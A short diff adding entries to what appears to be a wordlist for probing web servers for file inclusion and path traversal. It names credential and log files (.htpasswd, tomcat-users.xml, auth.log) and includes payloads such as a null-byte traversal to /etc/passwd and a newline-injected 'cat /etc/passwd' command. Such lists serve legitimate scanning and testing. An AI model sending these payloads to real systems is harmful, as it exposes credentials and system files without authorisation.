@@ -1,0 +1,14 @@
+var/log/auth.log
+var/log/durian.log/access.log
+var/log/authlog
+var/www/.htpasswd
+var/mail/sam
+opt/bitnami/apache2/logs/access_log%00
+opt/bitnami/apache2/htdocs/webmail/
+admin/logs/system.log
+%0A/bin/cat%20/etc/passwd
+../../../../../../etc/passwd%00
+mailer/VERSION
+usr/share/tomcat9/etc/tomcat-users.xml
+app/etc/local.xml
+etc/knockd.conf
